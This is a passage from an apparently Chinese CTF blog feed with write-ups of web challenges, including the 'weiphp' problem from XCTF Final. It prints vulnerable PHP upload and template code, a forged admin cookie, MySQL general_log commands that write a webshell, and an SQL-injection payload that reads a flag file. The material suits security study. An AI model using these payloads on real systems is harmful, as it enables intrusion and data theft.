class="line">);</span><br><span class="line">$previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line">$base64 = $matches[<span class="number">2</span>];</span><br><span class="line">$type = $matches[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>) &#123;</span><br><span class="line">$type = <span class="string">'jpg'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strtolower($type)==<span class="string">'php'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hacked!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">$filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">$filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data = base64_decode($base64);</span><br><span class="line">file_put_contents($filePath, $data);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在漏洞的原因是…检测后缀太少了，就检测个php,有点像web2的那个附件上传的检测，有点虚假</p><p>代码大概逻辑：</p><p>首先建立下文件储存的preview文件夹</p><p>通过php://input，接受通过data协议传进来的文件，并且这个判断中判断了php，随便换成phtml或者其他的就行，最终写入previeww文件夹下，访问拿到shell,看先知的wp说后台存在弱口令，进去同样的文件上传漏洞，这里就不赘述了。</p><h3 id="粤湾投资"><a href="#粤湾投资" class="headerlink" title="粤湾投资"></a>粤湾投资</h3><p>emmm..比赛的时候还真没看见log的泄露orz..，这题存在传统的display的问题…（出题人的后门</p><p>Home\JqueryController.class.php中index函数</p><h4 id="display后门"><a href="#display后门" class="headerlink" title="display后门"></a>display后门</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">JqueryController</span> <span class="keyword">extends</span> <span class="title">CommonController</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 首页</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'template_file'</span>])) &#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;seoData = <span class="keyword">array</span>(<span class="string">'title'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'keywords'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'description'</span> =&gt; <span class="string">'Jquery插件'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;display();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;display($_GET[<span class="string">'template_file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显可以通过控制template_file去调用display拿到文件的内容返回</p><p>调用链为：display-&gt;Home\display-&gt;parseTemplate-&gt;view\display-&gt;fetch-&gt;listen-&gt;run-&gt;fetch-&gt;loadTemplate-&gt;compiler-&gt;put-&gt;load(PS:这是代码执行的调用)</p><p>调用链中还是少了几步的，写的是一些相对关键的调用</p><h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\UploadfileController.class.php 中 index函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(IS_POST)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1、如果是图片直接调用uploadPhoto()</span></span><br><span class="line"><span class="comment"> * 2、如果是替他附件则按照当前配置设置</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$type = I(<span class="string">'post.type'</span>,<span class="string">'files'</span>);</span><br><span class="line">$saveDir = I(<span class="string">'post.savedir'</span>);</span><br><span class="line">$thumbw = I(<span class="string">'post.thumbw'</span>);</span><br><span class="line">$thumbh = I(<span class="string">'post.thumbh'</span>);</span><br><span class="line">$filesize = I(<span class="string">'post.filesize'</span>);</span><br><span class="line"><span class="keyword">if</span>($type == <span class="string">'images'</span> || preg_match(<span class="string">'/^image\//'</span>, $_FILES[<span class="string">'Filedata'</span>][<span class="string">'type'</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">$type = <span class="string">"images"</span>;</span><br><span class="line"><span class="comment">//是否添加水印</span></span><br><span class="line">$water = I(<span class="string">'post.water'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($water)&#123;</span><br><span class="line">$water_site = C(<span class="string">'SITE_SYSTEM_IMG_WATER'</span>);</span><br><span class="line">$water_new = <span class="keyword">isset</span>($water_site) &amp;&amp; !<span class="keyword">empty</span>($water_site) ? $water_site : C(<span class="string">'SYSTEM_IMG_WATER'</span>);</span><br><span class="line">    <span class="comment">//$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=&gt;1));</span></span><br><span class="line">$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,$water_new,$filesize);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,<span class="string">''</span>,$filesize);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_array($info))&#123;</span><br><span class="line">$error_data[<span class="string">'info'</span>] = $info;</span><br><span class="line">$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file[<span class="string">'oringinal_type'</span>] = <span class="string">'images'</span>;</span><br><span class="line">$file[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">$file[<span class="string">'name'</span>] = $_FILES[<span class="string">'Filedata'</span>][<span class="string">'name'</span>][<span class="number">0</span>];</span><br><span class="line">$file[<span class="string">'savename'</span>] = $info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">$file[<span class="string">'photo'</span>] = substr($info[<span class="number">0</span>][<span class="string">'savepath'</span>],<span class="number">1</span>).$info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">$file[<span class="string">'thumb'</span>] = $info[<span class="number">0</span>][<span class="string">'thumbpath'</span>];</span><br><span class="line">$file[<span class="string">'location'</span>] = <span class="string">'upload'</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ajaxReturn($file);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$type = <span class="string">'files'</span>;</span><br><span class="line">$upload = <span class="keyword">new</span> \Think\Upload();</span><br><span class="line">$upload-&gt;maxSize = $filesize*<span class="number">1024</span>; <span class="comment">//文件上传的最大文件大小，附件最大100M</span></span><br><span class="line">$upload-&gt;rootPath = <span class="string">"./"</span>; <span class="comment">//文件上传保存的根路径</span></span><br><span class="line">$upload-&gt;savePath = $upload-&gt;rootPath.<span class="string">"Public/Uploads/"</span>.$saveDir.<span class="string">"/"</span> . $type .<span class="string">"/"</span>;<span class="comment">//文件上传的保存路径</span></span><br><span class="line">$upload-&gt;saveName = date(<span class="string">"YmdHis"</span>).<span class="string">"_"</span>.uniqid(); <span class="comment">//上传文件的保存规则</span></span><br><span class="line">$upload-&gt;replace = <span class="keyword">true</span>; <span class="comment">//存在同名文件是否是覆盖</span></span><br><span class="line">$upload-&gt;autoSub = <span class="keyword">true</span>;<span class="comment">//自动使用子目录保存上传文件</span></span><br><span class="line">$upload-&gt;subName = date(<span class="string">"Ymd"</span>);<span class="comment">//子目录创建方式，采用数组或者字符串式定义</span></span><br><span class="line">$upload-&gt;hash = <span class="keyword">true</span>;<span class="comment">//是否生成文件的hash编码 默认为true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$info = $upload-&gt;upload())&#123;</span><br><span class="line">$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;方</span><br><span class="line">$error_data[<span class="string">'info'</span>] = $upload-&gt;getError();</span><br><span class="line"><span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//处理文件图标</span></span><br><span class="line"><span class="comment">//excel</span></span><br><span class="line"><span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'xls'</span>,<span class="string">'xlsx'</span>)))&#123;</span><br><span class="line">$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'xls'</span>;</span><br></pre></td></tr></table></figure><p>两种上传操作，第一种是为了图片的上传，第二种是其他文件的上传，没有任何过滤，不过比赛的时候这道题的路由错了….，改下路由即可上传拿到shell</p><h3 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h3><h4 id="重装-后台getshell-非预期"><a href="#重装-后台getshell-非预期" class="headerlink" title="重装+后台getshell(非预期)"></a>重装+后台getshell(非预期)</h4><p>存在install.php，重装后进入后台，有多种途径可getshell</p><h4 id="cookie伪造-后台getshell-预期"><a href="#cookie伪造-后台getshell-预期" class="headerlink" title="cookie伪造+后台getshell(预期)"></a>cookie伪造+后台getshell(预期)</h4><p>官方做法：</p><p>/admin/plugin.php</p><p>伪造：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EM_AUTHCOOKIE_W5ybaCEXHdrHWkYBR6bvBATPe8K9inQP=admin%7C%7Ce13aca594aae3d6240938911ac7257f7;</span><br></pre></td></tr></table></figure><p>利用：</p><p>然后在后台系统，插件管理处可以上传压缩包格式的插件，需要上传文件夹名和文件名相同的内容的压缩包，而且是 php 文件，因此可以构造以下形式的压缩包上传生成后门然后访问/content/plugins/1/1.php，读取flag：</p><h3 id="粤湾租赁"><a href="#粤湾租赁" class="headerlink" title="粤湾租赁"></a>粤湾租赁</h3><p>挺伤的一道题…弱密码进去之后就是巅峰极客的操作..这场比赛没了burp可真难受</p><p>常规操作</p><h4 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log = <span class="string">"ON"</span>;</span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/var/www/html/shell.php'</span>;</span><br></pre></td></tr></table></figure><h4 id="sqli-反序列化"><a href="#sqli-反序列化" class="headerlink" title="sqli+反序列化"></a>sqli+反序列化</h4><p>cookie头中ECSCP[lastfilter]存在反序列化漏洞</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">"composite_status"</span>;s:<span class="number">86</span>:<span class="string">"1'and(extractvalue(1,concat(0x7e,substr((select load_file('/flag.txt')),1,16),0x7e)))#"</span>;&#125;</span><br></pre></td></tr></table></figure><h4 id="后台语言配置处可写shell"><a href="#后台语言配置处可写shell" class="headerlink" title="后台语言配置处可写shell"></a>后台语言配置处可写shell</h4><p>admin\languages\zh_cn\common.php</p><p><a href="https://imgchr.com/i/MxyhE8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/26/MxyhE8.md.png" alt="MxyhE8.md.png"></a></p><p>写一个shell语句，访问common.php拿到shell</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>希望可以快速调整好状态，加油！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近的状态一直很差，每天都沉浸在一种很难受的情绪，大概持续了三个星期左右，导致精神状态每天都特别差，这段时间也没有怎么学习，红帽杯打的也不太
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Final 部分题目复现</title>
    <link href="http://yoursite.com/2019/11/20/XCTF-Final-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/20/XCTF-Final-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-20T14:18:39.000Z</published>
    <updated>2019-11-20T14:19:38.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>前段时间又看到ROIS发的final wp,思路真的tql，然而我连联合战队都没有，也没法接触到final，xmsl（好好学习吧</p><h3 id="weiphp"><a href="#weiphp" class="headerlink" title="weiphp"></a>weiphp</h3><p>复现的时候看是有两种解法的，分别为ssrf和上传地方的漏洞</p><h4 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h4><p>跟进File类中的upload方法 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">//用户登录检测</span></span><br><span class="line">   <span class="keyword">if</span> (!is_login())&#123;</span><br><span class="line">    $return = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'status'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">'code'</span>=&gt;<span class="number">0</span>,</span><br><span class="line">    <span class="string">'info'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">    <span class="string">'msg'</span> =&gt; <span class="string">'上传失败，请先登录'</span>,</span><br><span class="line">    <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> json_encode($return);</span><br><span class="line">    &#125;</span><br><span class="line">        $return = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'status'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'info'</span> =&gt; <span class="string">'上传成功'</span>,</span><br><span class="line">            <span class="string">'data'</span> =&gt; <span class="string">''</span></span><br><span class="line">        );</span><br><span class="line">        <span class="comment">/* 调用文件上传组件上传文件 */</span></span><br><span class="line">        $File = D(<span class="string">'home/File'</span>);</span><br><span class="line">        $file_driver = strtolower(config(<span class="string">'picture_upload_driver'</span>));</span><br><span class="line">        $info = $File-&gt;upload(config(<span class="string">'download_upload'</span>), config(<span class="string">'picture_upload_driver'</span>), config(<span class="string">"upload_&#123;$file_driver&#125;_config"</span>));</span><br><span class="line">        <span class="comment">/* 记录附件信息 */</span></span><br><span class="line">.....</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里调用了Model中File类的upload方法，再次跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($setting = [], $driver = <span class="string">'Local'</span>, $config = null, $isTest = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">/* 上传文件 */</span></span><br><span class="line">        $setting[<span class="string">'callback'</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">$this</span>,</span><br><span class="line">            <span class="string">'isFile'</span></span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    $info = upload_files($setting, $driver, $config, <span class="string">'download'</span>, $isTest);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 设置文件保存位置 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_auto[] = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'location'</span>,</span><br><span class="line">        <span class="string">'Ftp'</span> === $driver ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了upload_files函数去处理，并且信息返回给$info，跟进upload_files</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_files</span><span class="params">($setting = <span class="string">''</span>, $driver = <span class="string">''</span>, $config = <span class="string">''</span>, $type = <span class="string">'picture'</span>, $isTest = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $return[<span class="string">'msg'</span>] = <span class="string">''</span>;</span><br><span class="line">$files = request()-&gt;file();</span><br><span class="line"><span class="comment">// dump($_FILES);</span></span><br><span class="line"><span class="comment">// dump($files);//dump($rr);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($files) || count($files) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    $return[<span class="string">'msg'</span>] = <span class="string">'找不到上传文件'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($return[<span class="string">'msg'</span>] != <span class="string">''</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> $return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = key($files);</span><br><span class="line">$file = <span class="keyword">isset</span>($files[$key]) ? $files[$key] : [];</span><br><span class="line">$rootpath = <span class="string">'./uploads/'</span> . $type . <span class="string">'/'</span>;</span><br><span class="line">$saveName = time_format(time(), <span class="string">'Ymd'</span>) . <span class="string">'/'</span> . uniqid();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($setting[<span class="string">'rootPath'</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>($setting[<span class="string">'rootPath'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测上传根目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($rootpath) &amp;&amp; function_exists(<span class="string">'mkdirs'</span>)) &#123;</span><br><span class="line">        mkdirs($rootpath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(is_dir($rootpath) &amp;&amp; is_writable($rootpath))) &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = <span class="string">'上传根目录不存在！请尝试手动创建:'</span> . $rootpath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($return[<span class="string">'msg'</span>])) &#123;</span><br><span class="line">    <span class="comment">//判断扩展名是不是php,不支持上传php文件</span></span><br><span class="line">    $info = $file-&gt;getInfo();</span><br><span class="line">    $info = pathinfo($info[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (strtolower($info[<span class="string">'extension'</span>]) == <span class="string">'php'</span>) &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = <span class="string">'不支持上传该文件类型'</span>;</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">        $redata[$key] = $return;</span><br><span class="line">        <span class="keyword">return</span> $redata;</span><br><span class="line">    &#125;</span><br><span class="line">    $checkRule = [];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'picture'</span>) &#123;</span><br><span class="line">        <span class="comment">//图片扩展名验证 ，图片大小不超过20M</span></span><br><span class="line">        $checkRule[<span class="string">'ext'</span>] = <span class="string">'gif,jpg,jpeg,png,bmp'</span>;</span><br><span class="line">        $checkRule[<span class="string">'size'</span>] = <span class="number">20971520</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $allowExt = input(<span class="string">'allow_file_ext'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span> ($allowExt != <span class="string">''</span>) &#123;</span><br><span class="line">            $checkRule[<span class="string">'ext'</span>] = $allowExt;</span><br><span class="line">        &#125;</span><br><span class="line">        $allowSize = input(<span class="string">'allow_file_maxsize'</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span> ($allowSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $checkRule[<span class="string">'size'</span>] = $allowSize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $info = $file-&gt;isTest($isTest)</span><br><span class="line">        -&gt;rule(<span class="string">'uniqid'</span>)</span><br><span class="line">        -&gt;validate($checkRule)</span><br><span class="line">        -&gt;move($rootpath, DIRECTORY_SEPARATOR . $saveName);</span><br><span class="line">    <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">        $return[<span class="string">'mime'</span>] = $info-&gt;getMime();</span><br><span class="line">        $return[<span class="string">'name'</span>] = $info-&gt;getFilename();</span><br><span class="line">        $return[<span class="string">'key'</span>] = $key;</span><br><span class="line">        $return[<span class="string">'ext'</span>] = $info-&gt;getExtension();</span><br><span class="line">        $return[<span class="string">'savename'</span>] = str_replace(<span class="string">'\\'</span>, <span class="string">'/'</span>, $info-&gt;getSaveName());</span><br><span class="line">        $return[<span class="string">'md5'</span>] = $info-&gt;md5();</span><br><span class="line">        $return[<span class="string">'sha1'</span>] = $info-&gt;sha1();</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">1</span>;</span><br><span class="line">        $of = $info-&gt;getInfo();</span><br><span class="line">        <span class="keyword">isset</span>($of[<span class="string">'name'</span>]) || $of[<span class="string">'name'</span>] = $return[<span class="string">'name'</span>];</span><br><span class="line">        $return[<span class="string">'old_name'</span>] = $of[<span class="string">'name'</span>];</span><br><span class="line">        $return[<span class="string">'size'</span>] = <span class="keyword">isset</span>($of[<span class="string">'size'</span>]) ? $of[<span class="string">'size'</span>] : <span class="number">0</span>;</span><br><span class="line">        $return[<span class="string">'rootPath'</span>] = $rootpath;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $return[<span class="string">'msg'</span>] = $file-&gt;getError();</span><br><span class="line">        $return[<span class="string">'code'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$redata[$key] = $return;</span><br><span class="line"><span class="keyword">return</span> $redata;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以通过传入allow_file_ext去自定义允许的后缀，定义个phtml传上去即可getshell</p><p>不过直接调用upload方法会存在is_login()的验证，所以可以换为upload_root函数就免去了login的验证，最后通过表单设置allow_file_ext</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>从zedd师傅博客里看到的做法</p><p>跟进Base.php中的post_data函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post_data</span><span class="params">($url, $param, $type = <span class="string">'json'</span>, $return_array = true, $useCert = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $res = post_data($url, $param, $type, $return_array, $useCert);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 各种常见错误判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($res[<span class="string">'curl_erron'</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error($res[<span class="string">'curl_erron'</span>] . <span class="string">': '</span> . $res[<span class="string">'curl_error'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($return_array) &#123;</span><br><span 